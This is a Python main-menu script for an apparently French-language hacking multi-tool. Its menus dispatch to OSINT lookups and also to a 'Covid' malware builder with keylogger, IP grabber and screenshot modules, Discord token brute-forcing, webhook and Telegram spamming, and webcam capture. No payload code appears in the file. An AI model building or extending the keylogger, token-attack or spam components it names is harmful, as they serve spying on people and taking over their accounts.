import os
import threading
import time
from tkinter import Tk, filedialog

from code.colors import *
from code.core.menu import show_informations
from code.core.devtools import devtools
from code.core.rpc import start_rpc
from code.lookup.archive_check import archive_check
from code.lookup.discord_lookup import discord_lookup
from code.lookup.dns_lookup import dns_lookup
from code.lookup.github_lookup import github_lookup
from code.lookup.google_search import google_search
from code.lookup.leak_check import leak_check
from code.lookup.username_lookup import username_lookup
from code.security.password_gen import gen_password
from code.security.proxy import proxy_vpn
from code.security.scraper import http_scraper
from code.security.web_status import website_status
from code.security.whois_lookup import whois_lookup
from code.discord.bot_invite import bot_invite
from code.discord.darkweb_display import darkweb_display
from code.discord.nitro import nitro_gen
from code.discord.token_tools import token_bruteforce
from code.discord.webhook_spam import webhook_spam
from code.covid.build import build_covid
from code.covid.ip_grab import grab_ip
from code.covid.keylogger import keylogger
from code.covid.screenshot import screenshot
from code.modules.ai import ai
from code.modules.checking import holehe
from code.modules.discordchecker import main as discord_checker
from code.modules.embedsender import sender
from code.modules.genip import ip
from code.modules.githubchecker import git
from code.modules.ipscanner import ip
from code.modules.letsenscript import domaine
from code.modules.passwordmanager import passwdmanage
from code.modules.robloxsearch import roblox
from code.modules.rpc import rpc_conf
from code.modules.Spamtlgrm import tlgrm
from code.modules.tiktokchecker import tiktok
from code.modules.tokencheck import tokenchecker
from code.modules.webcamcapt import webcam
from code.challange.firstchallange import osint
from code.challange.pentestchallange import main as pentest_web
from code.modules.autofollowinsta import instaautomation
from code.modules.ip import ipchoix
from code.modules.ipreputation import ip_reputation
from code.modules.number import numberchoix
from sites import sites

# ANCHOR - Command thread
threading.Thread(target=start_rpc, daemon=True).start()

while True:
    os.system("cls")
    choix = input(f""" {WHITE}
            ██╗    ██╗██╗  ██╗██╗████████╗███████╗██╗    ██╗ ██████╗ ██╗     ███████╗
            ██║    ██║██║  ██║██║╚══██╔══╝██╔════╝██║    ██║██╔═══██╗██║     ██╔════╝
            ██║ █╗ ██║███████║██║   ██║   █████╗  ██║ █╗ ██║██║   ██║██║     █████╗  
            ██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██║███╗██║██║   ██║██║     ██╔══╝  
            ╚███╔███╔╝██║  ██║██║   ██║   ███████╗╚███╔███╔╝╚██████╔╝███████╗██║     
             ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝     
        [I]. Informations                                      

            1. [Lookup]    4. [Covid]
            2. [Sécurity]  5. [Automation]
            3. [Discord]   6. [Quit]

            Fais ton choix : """).lower()
        
    if  choix == "1":
        os.system("cls")
        choix2 = input(f""" {WHITE}
                            ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
                            ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
                            ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝
                            ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝ 
                            ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║     
                            ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     
                    [I]. Informations                                      

                            1. [IP]          4. [Google]      7. [Github]      10. [4C Tiktok]  13. [SSL / TLS]    16. [Holehe]
                            2. [Number]      5. [Dns]         8. [Leak Mail]   11. [4C Github]  14. [Roblox]       17. [Quit]
                            3. [Username]    6. [DISCORD]     9. [Archive Web] 12. [IP Scanner] 15. [AI]

                            Fais ton choix : """).lower()
        if choix2 == "1":
            ipchoix()

        # Ici je mais mon deuxième choçix donc Lookup Number
        elif choix2 == "2":
            numberchoix()

        elif choix2 == "3":
            username_lookup(sites)
        elif choix2 == "4":
            google_search()
        elif choix2 == "5":
            dns_lookup()
        elif choix2 == "6":
            discord_lookup()


        elif choix2 == "7":
            github_lookup()
        elif choix2 == "8":
            leak_check()
        elif choix2 == "9":
            archive_check()
        elif choix2 == "10":
            tiktok()
        
        elif choix2 == "11":
            git()
        
        elif choix2 == "12":
            ip()
        
        elif choix2 == "13":
            domaine()

        elif choix2 == "14":
            roblox()

        elif choix2 == "15":
            ai()

        elif choix2 == "16":
            holehe()

        elif choix2 == "i":
            show_informations()

        elif choix2 == "17":
            print("Tu va quitté le tools")
            time.sleep(2)
            print("Au-Revoir :)")
            time.sleep(2)
            break

    # Menu sécurity
    elif choix == "2":
        os.system("cls")
        choix3 = input(f""" {WHITE}
        ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
        ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
        ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
        ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
        ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
        ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
    [I]. Informations    
        1. [PROXY(VPN)]     4. [Scraper] 7. [Spam Telegram]  10. [Pentest Web]  13. [Quit]
        2. [Gen Password]   5. [Whois]   8. [Passwd Manager] 11. [Webcam]
        3. [Status Website] 6. [Gen IP]  9. [Osint]          12. [Ip reput]
            {WHITE}
        Fais ton choix : """).lower()

        if choix3 == "1":
            proxy_vpn()
        
        elif choix3 == "2":
            gen_password()
        elif choix3 == "3":
            website_status()
        elif choix3 == "4":
            http_scraper()
        elif choix3 == "5":
            whois_lookup()
        elif choix3 == "6":
            ip()

        elif choix3 == "7":
            tlgrm()
        
        elif choix3 == "8":
            passwdmanage()

        elif choix3 == "9":
            osint()

        elif choix3 == "10":
            pentest_web()
        
        elif choix3 == "11":
            webcam()
        
        elif choix3 == "12":
            ip_reputation()

        elif choix3 == "i":
            show_informations()

        elif choix3 == "13":
            print("Au-Revoir a bientot l'amis")
            time.sleep(2)
            break
    # catgegories
    elif choix == "3":
        os.system("cls")
        discord = input(f""" {WHITE}
            ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
            ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
            ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
            ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
            ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
            ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
        [I]. Informations               

            1. [Nitro Gen]       4. [Token BruteForce]  7. [rpc_conf]   10. [Quit]
            2. [Spaming Webhook] 5. [Bot to id]         8. [Token check]
            3. [Darkweb]         6. [4c Checker]        9. [Webhook sender]
                {WHITE}
            Choisis : """).lower()

        if discord == "1":
            nitro_gen()
        elif discord == "2":
            webhook_spam()
        elif discord == "3":
            darkweb_display()
        elif discord == "4":
            token_bruteforce()
        elif discord == "5":
            bot_invite()
        elif discord == "6":
            discord_checker()
        elif discord == "7":
            rpc_conf()
        elif discord == "8":
            tokenchecker()
        elif discord == "9":
            sender()
        elif discord == "i":
            show_informations()
        elif discord == "10":
            print("Aurevoir l'amis")
            time.sleep(2)
            break

    elif choix == "4":
        try:
            os.system("cls")
            covid = input(f""" {WHITE}
                 ██████╗ ██████╗ ██╗   ██╗██╗██████╗      ██╗ █████╗ 
                ██╔════╝██╔═══██╗██║   ██║██║██╔══██╗    ███║██╔══██╗
                ██║     ██║   ██║██║   ██║██║██║  ██║    ╚██║╚██████║
                ██║     ██║   ██║╚██╗ ██╔╝██║██║  ██║     ██║ ╚═══██║
                ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝     ██║ █████╔╝
                ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝      ╚═╝ ╚════╝ 
                
                1. [KeyLogger]  4. [Build Covid]
                2. [Grabing IP] 5. [Quit]
                3. [ScreenShot]

                    {WHITE}
                Fais ton choix : """)
        except ValueError as e:
            print(f"Error {e}")
        
        if covid == "1":
            keylogger()
        elif covid == "2":
            grab_ip()
        elif covid == "3":
            screenshot()
        elif covid == "4":
            build_covid()
        elif covid == "5":
            print("Au-Revoir a bientot l'amis")
            time.sleep(2)
            break
    elif choix == "5":
        automation = input(f"""{MAGENTA}
        ▄████▄ ██  ██ ██████ ▄████▄ ██▄  ▄██ ▄████▄ ██████ ██ ▄████▄ ███  ██ 
        ██▄▄██ ██  ██   ██   ██  ██ ██ ▀▀ ██ ██▄▄██   ██   ██ ██  ██ ██ ▀▄██ 
        ██  ██ ▀████▀   ██   ▀████▀ ██    ██ ██  ██   ██   ██ ▀████▀ ██   ██ 
                                                                        
        i. [Information]

        1. [Instagram Auto Follow]           
        2. [Quit]
                        
                            
        Fais ton choix : """)
        
        if automation == "1":
            instaautomation()
        elif automation == "2":
            print(f"Tu va quitté")
            time.sleep(3)
            break
        elif automation == "i":
            show_informations()

    # Ici on a mis le quit si la personne a lancé sans fair expres
    elif choix == "6":
        print("Au-Revoir a bientot l'ami")
        time.sleep(2)
        break
    elif choix == "i":
        show_informations()